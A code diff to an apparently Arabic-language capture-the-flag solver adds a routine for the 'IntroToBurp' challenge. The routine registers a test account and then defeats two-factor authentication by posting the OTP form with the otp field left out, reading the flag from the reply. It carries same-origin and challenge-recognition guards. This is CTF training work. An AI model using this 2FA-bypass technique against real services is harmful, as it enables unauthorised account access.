@@ -37,7 +37,7 @@ from datetime import datetime, timezone
 from email.utils import parsedate_to_datetime
 from urllib.parse import urlsplit, urlencode, urljoin, quote
 
-__version__ = "2.7.1"
+__version__ = "2.8.0"
 
 # --------------------------------------------------------------------------- #
 DEFAULT_FLAG_PATTERNS = [
@@ -1057,7 +1057,7 @@ _STATIC_CHALLENGES = {
 }
 
 _STATIC_GUIDANCE = {
-    "intro-to-burp": "سجّل حسابًا تجريبيًا ثم افحص استجابة تسجيل الدخول وطلب 2FA. سيعرض صقر النماذج والحقول والاستجابات؛ لا يخمّن رمز OTP.",
+    "intro-to-burp": "يسجل صقر حسابًا تجريبيًا من النموذج المكتشف. في مرحلة 2FA يرسل POST فارغًا بلا حقل otp، ثم يقرأ العلم من الاستجابة؛ هذا يشرح أثر التحقق من وجود الحقل بدل التحقق من الرمز.",
     "no-fa": "يحتاج هذا التحدي ملف users.db وقائمة كلمات مرور محلية. افحص تجزئة SHA-256 دون إرسال محاولات دخول عشوائية؛ ثم راجع جلسة Flask ومرحلة 2FA.",
     "hashgate": "تُظهر الصفحة معرّف المستخدم؛ افحص تحقق الخادم من المعرّف المجزأ، ثم اختبر معرّفات الموظفين المحدودة التي يثبتها وصف التحدي.",
     "credential-stuffing": "هذا تحدٍ عبر TCP وملف بيانات اعتماد منفصل، وليس صفحة HTTP. شغّل المحلل الطرفي على ملف creds-dump المرفق مع تأخير وحد أقصى للمحاولات ضمن خدمة التحدي فقط.",
@@ -1081,6 +1081,104 @@ def detect_named_challenge(challenge_text: str | None):
         if title.search(text):
             return _STATIC_CHALLENGES[needle]
     return None
+
+
+def _hidden_form_values(html: str) -> dict[str, str]:
+    values = {}
+    for tag in re.findall(r"<input\b[^>]*>", html, re.I | re.S):
+        typ = re.search(r"\btype\s*=\s*(['\"]?)([^\s>'\"]+)\1", tag, re.I)
+        name = re.search(r"\bname\s*=\s*(['\"])(.*?)\1", tag, re.I | re.S)
+        value = re.search(r"\bvalue\s*=\s*(['\"])(.*?)\1", tag, re.I | re.S)
+        if name and value and (not typ or typ.group(2).lower() == "hidden"):
+            values[html_lib.unescape(name.group(2))] = html_lib.unescape(value.group(2))
+    return values
+
+
+def solve_intro_to_burp(client, origin, recon, steps, bodies, record,
+                        flag_patterns) -> dict:
+    res = _base_result(origin, "IntroToBurp", "intro-to-burp", recognized=True)
+    res["steps"] = steps
+    reg = next((f for f in recon.get("forms", []) if f.get("method") == "POST" and
+                {x.lower() for x in f.get("fields", [])}.issuperset(
+                    {"full_name", "username", "phone_number", "city", "password"})), None)
+    res["discovered"] = {"registration_fields": reg.get("fields", []) if reg else [],
+                         "csrf_protected": bool(re.search(r"name=['\"]csrf_token['\"]", recon.get("html", ""), re.I))}
+    if not reg:
+        res["warnings"].append("لم يظهر نموذج التسجيل المتوقع؛ أوقف صقر التنفيذ دون إرسال بيانات.")
+        return res
+
+    values = _hidden_form_values(recon["html"])
+    username = "falcon" + secrets.token_hex(5)
+    for field in reg["fields"]:
+        low = field.lower()
+        if field in values:
+            continue
+        if low == "full_name": values[field] = "Falcon Student"
+        elif low == "username": values[field] = username
+        elif low == "phone_number": values[field] = "0000000000"
+        elif low == "city": values[field] = "Muscat"
+        elif low == "password": values[field] = TEST_PASSWORD
+        elif low == "submit": values[field] = "Register"
+    if not all(any(k.lower() == f for k in values) for f in ("full_name", "username", "phone_number", "city", "password")):
+        res["warnings"].append("تعذر ملء حقول التسجيل المكتشفة بأمان؛ لم يُرسل النموذج.")
+        return res
+
+    registration_url = urljoin(origin, reg.get("action") or "")
+    try:
+        posted = client.request("POST", registration_url, urlencode(values))
+        record(posted, ["أرسل صقر بيانات تدريبية إلى حقول التسجيل التي كشفها النموذج؛ كلمة المرور لا تُعرض في السجل."])
+    except (OSError, http.client.HTTPException, ValueError) as e:
+        res["warnings"].append(f"تعذر إرسال التسجيل: {e}")
+        return res
+    if posted["status"] not in (301, 302, 303, 307, 308) or not posted.get("location"):
+        res["warnings"].append("لم يعطِ التسجيل تحويلًا ناجحًا معلنًا؛ لم يُجرّب مسار 2FA.")
+        return res
+    dashboard_url = urljoin(registration_url, posted["location"])
+    if urlsplit(dashboard_url).netloc != urlsplit(origin).netloc:
+        res["warnings"].append("حُظر تحويل التسجيل إلى أصل آخر.")
+        return res
+    try:
+        dashboard = client.request("GET", dashboard_url)
+        record(dashboard, ["اتبع صقر تحويل التسجيل الذي أعاده الخادم إلى صفحة الخطوة التالية."])
+    except (OSError, http.client.HTTPException, ValueError) as e:
+        res["warnings"].append(f"تعذر فتح الصفحة التالية: {e}")
+        return res
+    otp_form = next((f for f in find_forms(dashboard["body"])
+                     if f.get("method") == "POST" and any(x.lower() == "otp" for x in f.get("fields", []))), None)
+    if not otp_form:
+        res["warnings"].append("لم يظهر نموذج POST بحقل otp بعد التسجيل؛ توقف صقر دون تعديل الطلب.")
+        return res
+
+    otp_url = urljoin(dashboard_url, otp_form.get("action") or "")
+    if urlsplit(otp_url).netloc != urlsplit(origin).netloc:
+        res["warnings"].append("حُظر نموذج OTP الذي يشير إلى أصل آخر.")
+        return res
+    try:
+        # Deliberately omit the otp field. This is the challenge's malformed
+        # request lesson, and it is reachable only after the challenge title
+        # and both real forms have been confirmed.
+        otp_hidden = _hidden_form_values(dashboard["body"])
+        bypass = client.request("POST", otp_url, urlencode(otp_hidden) if otp_hidden else "")
+        record(bypass, ["اختبر صقر خلل IntroToBurp المحدد: أرسل النموذج بلا حقل otp، بعد إثبات وجود النموذج الفعلي."])
+    except (OSError, http.client.HTTPException, ValueError) as e:
+        res["warnings"].append(f"تعذر إرسال طلب الاختبار: {e}")
+        return res
+    flag, source = extract_flag([(f"step{len(steps)}:empty-otp-response", bypass["body"])], flag_patterns)
+    if not flag and bypass.get("location") and bypass["status"] in (301, 302, 303, 307, 308):
+        next_url = urljoin(otp_url, bypass["location"])
+        if urlsplit(next_url).netloc == urlsplit(origin).netloc:
+            try:
+                final = client.request("GET", next_url)
+                record(final, ["قراءة الصفحة التي أعلن عنها تحويل نتيجة 2FA ضمن أصل التحدي."])
+                flag, source = extract_flag([(f"step{len(steps)}:post-otp-page", final["body"])], flag_patterns)
+            except (OSError, http.client.HTTPException, ValueError):
+                pass
+    if flag:
+        res["success"], res["flag"], res["flag_source"] = True, flag, source
+        res["explanation_ar"].append("أعاد الخادم العلم بعد طلب POST لا يحتوي حقل otp؛ هذا يثبت خلل التحقق في مسار التحدي.")
+    else:
+        res["warnings"].append("لم تُرجع استجابة طلب OTP الفارغ علمًا؛ راجع حالة الاستجابة ونصها.")
+    return res
 
 
 def _page_resources(html: str, base_url: str) -> list[str]:
@@ -1412,6 +1510,8 @@ def run_audit(url: str,
 
     named = detect_named_challenge(challenge_text)
     if named:
+        if named[1] == "intro-to-burp":
+            return solve_intro_to_burp(client, origin, recon, steps, bodies, record, flag_patterns)
         return _known_challenge_result(client, origin, recon, named[0], named[1],
                                        steps, bodies, record, flag_patterns)
 
